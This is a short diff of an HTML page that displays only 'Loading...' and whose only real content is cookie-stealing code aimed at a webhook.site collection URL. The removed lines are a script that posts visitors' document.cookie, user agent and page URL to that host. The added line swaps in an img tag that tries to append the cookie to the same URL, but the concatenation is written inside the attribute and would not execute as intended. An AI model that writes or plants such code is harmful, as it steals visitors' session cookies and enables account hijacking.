@@ -5,18 +5,6 @@
   </head>
   <body>
     <h1>Loading...</h1>
-    <script>
-      fetch("https://webhook.site/1f865f43-5e9c-42f8-b291-08523a2464ce", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          cookie: document.cookie,
-          userAgent: navigator.userAgent,
-          url: window.location.href
-        })
-      });
-    </script>
+    <img src="https://webhook.site/1f865f43-5e9c-42f8-b291-08523a2464ce?cookie="+document.cookie />
   </body>
 </html>
